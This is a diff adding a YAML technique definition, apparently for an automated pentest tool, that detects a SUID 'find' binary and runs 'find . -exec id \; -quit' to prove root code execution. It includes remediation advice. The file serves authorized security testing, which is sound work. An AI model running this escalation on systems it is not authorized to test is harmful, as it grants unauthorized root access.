@@ -1,0 +1,29 @@
+# SUID find → root (GTFOBins)
+technique: T1548.001
+name: SUID find → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: find
+execute:
+  # `-quit` after the -exec ensures exactly one invocation, so nothing
+  # else runs after `id` and the shell stays out of a wide traversal.
+  command: "{{binary}} . -exec id \\; -quit"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID find lets an operator use `-exec` to run any command with the
+    SUID context (root). `-quit` after one exec keeps the invocation
+    tidy — a single `id` proves the primitive.
+  remediation: >
+    Remove the SUID bit from find. There's no legitimate reason for
+    find to be SUID-root on a sane image.
+  refs: [T1548.001, GTFOBins/find]
